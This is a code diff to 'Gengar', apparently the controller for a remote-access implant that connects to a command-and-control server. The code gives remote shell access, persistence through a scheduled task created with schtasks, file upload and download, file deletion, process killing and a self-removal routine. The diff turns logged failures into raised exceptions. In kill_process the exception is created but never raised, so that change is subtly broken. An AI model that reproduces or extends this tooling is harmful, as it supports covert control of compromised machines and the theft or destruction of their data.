@@ -37,6 +37,11 @@ class GengarDisconnected(Exception):
         return 'Gengar has disconnected from the CNC.'
 
 
+class GengarError(Exception):
+    def __init__(self, msg: str):
+        self.message = msg
+
+
 @dataclass
 class ShellOutput:
     exit_code: int
@@ -113,8 +118,7 @@ class Gengar:
         self.move_file(self._get_path(), self._GENGAR_PATH)
         create_task_cmd_output = self.shell(self._SCHTASKS_CREATE_CMD)
         if create_task_cmd_output.exit_code != 0:
-            logger.error(f'Failed to create scheduled task: {create_task_cmd_output.output}')
-            return
+            raise GengarError(f'Failed to create scheduled task: {create_task_cmd_output.output}')
 
     def unpersist(self):
         if not self.is_persistent():
@@ -123,8 +127,7 @@ class Gengar:
         self.delete_file(self._GENGAR_PATH)
         delete_task_cmd_output = self.shell(self._SCHTASKS_DELETE_CMD)
         if delete_task_cmd_output.exit_code != 0:
-            logger.error(f'Failed to delete scheduled task: {delete_task_cmd_output.output}')
-            return
+            raise GengarError(f'Failed to delete scheduled task: {delete_task_cmd_output.output}')
 
     def shell(self, cmd: str) -> ShellOutput:
         output = b''
@@ -152,8 +155,7 @@ class Gengar:
                    struct.pack('I', len(remote_path)) + remote_path.encode())
         return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
         if return_code != 0:
-            logger.error(f'Failed to download file: {return_code}')
-            return
+            raise GengarError(f'Failed to download file: {return_code}')
 
         bytes_remaining = struct.unpack('Q', self._recvall(LONG_SIZE))[0]
         logger.info(f'Downloading {remote_path} ({bytes_remaining})')
@@ -171,8 +173,7 @@ class Gengar:
                    struct.pack('I', len(remote_path)) + remote_path.encode())
         return_code = struct.unpack('I', self._recvall(INT_SIZE))[0]
         if return_code != 0:
-            logger.error(f'Failed to download file: {return_code}')
-            return
+            raise GengarError(f'Failed to download file: {return_code}')
 
         file_size = os.path.getsize(local_path)
         self._send(struct.pack('Q', file_size))
@@ -187,12 +188,12 @@ class Gengar:
     def delete_file(self, remote_path: str) -> None:
         output = self.shell(f'del {remote_path}')
         if output.exit_code != 0:
-            logger.error(f'Failed to delete file: {output.output}')
+            raise GengarError(f'Failed to delete file: {output.output}')
 
     def move_file(self, src_remote_path: str, dst_remote_path: str) -> None:
         output = self.shell(f'move {src_remote_path} {dst_remote_path}')
         if output.exit_code != 0:
-            logger.error(f'Failed to move file: {output.output}')
+            raise GengarError(f'Failed to move file: {output.output}')
 
     def file_exists(self, remote_path: str) -> bool:
         return self.shell(f'if exist {remote_path} (exit 0) else (exit 1)').exit_code == 0
@@ -216,7 +217,7 @@ class Gengar:
     def kill_process(self, process_name: str) -> None:
         output = self.shell(f'taskkill /F /IM {process_name}')
         if output.exit_code != 0:
-            logger.error(f'Failed to kill process: {output.output}')
+            GengarError(f'Failed to kill process: {output.output}')
 
     def suicide(self) -> None:
         self.unpersist()
